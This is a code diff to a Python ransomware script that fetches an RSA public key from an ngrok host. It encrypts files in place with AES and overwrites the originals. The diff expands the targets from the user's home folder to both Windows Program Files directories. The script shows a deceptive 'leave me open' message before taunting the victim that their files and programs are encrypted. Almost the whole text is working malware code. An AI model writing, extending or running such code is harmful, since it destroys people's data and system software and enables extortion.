@@ -26,7 +26,11 @@ import secrets
 
 # ngrok HTTP URL
 NGROK_URL = "https://placeholder.ngrok-free.app"
-TARGET_FOLDER = os.path.expanduser("~")
+TARGET_FOLDER = [
+    os.environ.get("ProgramFiles", "C:\\Program Files"),
+    os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"),
+    os.path.expanduser("~")
+    ]
 encrypted_files = []
 
 
@@ -51,43 +55,44 @@ def receive_public_key(host_url):
 def encrypt_file(public_key):
     global encrypted_files
     encrypted_files = []
-    for root, dirs, files in os.walk(TARGET_FOLDER):
-        for filename in files:
-            file_path = os.path.join(root, filename)
-            try:
-                with open(file_path, "rb") as f:
-                    plaintext = f.read()
-            except Exception:
-                continue
-
-            try:
-                aes_key = secrets.token_bytes(32)
-                iv = secrets.token_bytes(16)
-
-                padder = sym_padding.PKCS7(128).padder()
-                padded_data = padder.update(plaintext) + padder.finalize()
-
-                cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
-                encryptor = cipher.encryptor()
-                ciphertext = encryptor.update(padded_data) + encryptor.finalize()
-
-                encrypted_key = public_key.encrypt(
-                    aes_key,
-                    padding.OAEP(
-                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                        algorithm=hashes.SHA256(),
-                        label=None
+    for folder in TARGET_FOLDER:
+        for root, dirs, files in os.walk(folder, topdown=True):
+            for filename in files:
+                file_path = os.path.join(root, filename)
+                try:
+                    with open(file_path, "rb") as f:
+                        plaintext = f.read()
+                except Exception:
+                    continue
+    
+                try:
+                    aes_key = secrets.token_bytes(32)
+                    iv = secrets.token_bytes(16)
+    
+                    padder = sym_padding.PKCS7(128).padder()
+                    padded_data = padder.update(plaintext) + padder.finalize()
+    
+                    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
+                    encryptor = cipher.encryptor()
+                    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+    
+                    encrypted_key = public_key.encrypt(
+                        aes_key,
+                        padding.OAEP(
+                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                            algorithm=hashes.SHA256(),
+                            label=None
+                        )
                     )
-                )
-
-                with open(file_path, "wb") as f:
-                    f.write(len(encrypted_key).to_bytes(4, 'big') + encrypted_key)
-                    f.write(iv)
-                    f.write(ciphertext)
-
-                encrypted_files.append(file_path)
-            except Exception:
-                pass
+    
+                    with open(file_path, "wb") as f:
+                        f.write(len(encrypted_key).to_bytes(4, 'big') + encrypted_key)
+                        f.write(iv)
+                        f.write(ciphertext)
+    
+                    encrypted_files.append(file_path)
+                except Exception:
+                    pass
 
 
 def decrypt_file(private_key):
@@ -163,7 +168,6 @@ if __name__ == "__main__":
     print("Hi hello, currently I am doing something so please give me a minute and leave me open thank you.")
     encrypt_file(public_key)
     os.system("cls")
-    print("Whoops! Looks like I've encrypted your user folder :p")
+    print("Whoops! Looks like I've encrypted your user folder and all your program files :p")
     await_private_key()
-
     input("Ok you can close me now.")
